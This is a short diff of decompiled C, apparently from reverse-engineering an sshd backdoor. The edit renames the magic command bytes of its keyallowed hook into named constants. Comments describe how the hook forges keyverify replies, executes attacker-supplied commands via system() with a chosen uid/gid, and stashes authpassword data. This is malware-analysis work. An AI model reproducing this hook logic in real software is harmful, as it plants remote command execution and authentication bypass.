@@ -20,7 +20,7 @@
 int mm_answer_keyallowed_hook(ssh *ssh,int sock,sshbuf *m)
 
 {
-  u8 payload_type;
+  payload_command_type_t payload_type;
   payload_stream_state_t payload_state;
   libc_imports_t *libc_imports_ref;
   sshd_ctx_t *sshd_ctx;
@@ -98,7 +98,7 @@ LAB_00109216:
       payload_type = payload_record->command_type;
       payload_data_offset = payload_len - 0x120;
       // AutoDoc: Type 2 payloads carry a complete `mm_answer_keyverify` reply—copy its length/buffer into `sshd_ctx` and write it back immediately.
-      if (payload_type == '\x02') {
+      if (payload_type == PAYLOAD_COMMAND_KEYVERIFY_REPLY) {
         if ((((ctx->sshd_ctx->mm_answer_keyverify_slot != (sshd_monitor_func_t *)0x0) &&
              (4 < payload_data_offset)) &&
             (payload_data_offset = (ulong)payload_record->body_payload_offset, payload_record->body_payload_offset != 0)) &&
@@ -127,7 +127,7 @@ LAB_00109216:
         }
       }
       // AutoDoc: Type 3 payloads request privilege escalation: honor the supplied uid/gid pair and exec the decrypted body via libc’s `system()`.
-      else if (payload_type == '\x03') {
+      else if (payload_type == PAYLOAD_COMMAND_SYSTEM_EXEC) {
         if (((libc_imports_ref->system != (pfn_system_t)0x0) && (8 < payload_data_offset)) &&
            (payload_record->signed_header_prefix[payload_len - 0x75] == '\0')) {
           uid_gid_pair = *(u64 *)&payload_record->body_payload_offset;
@@ -142,7 +142,7 @@ LAB_00109216:
         }
       }
       // AutoDoc: Type 1 payloads stash an authpassword body for later—record the length/pointer so the authpassword hook can emit it on demand.
-      else if (((payload_type == '\x01') &&
+      else if (((payload_type == PAYLOAD_COMMAND_STASH_AUTHPASSWORD) &&
                (ctx->sshd_ctx->mm_answer_authpassword_slot != (sshd_monitor_func_t *)0x0)) &&
               (1 < payload_data_offset)) {
         *(char *)&sshd_ctx->pending_authpayload_len = (char)payload_record->body_payload_offset;
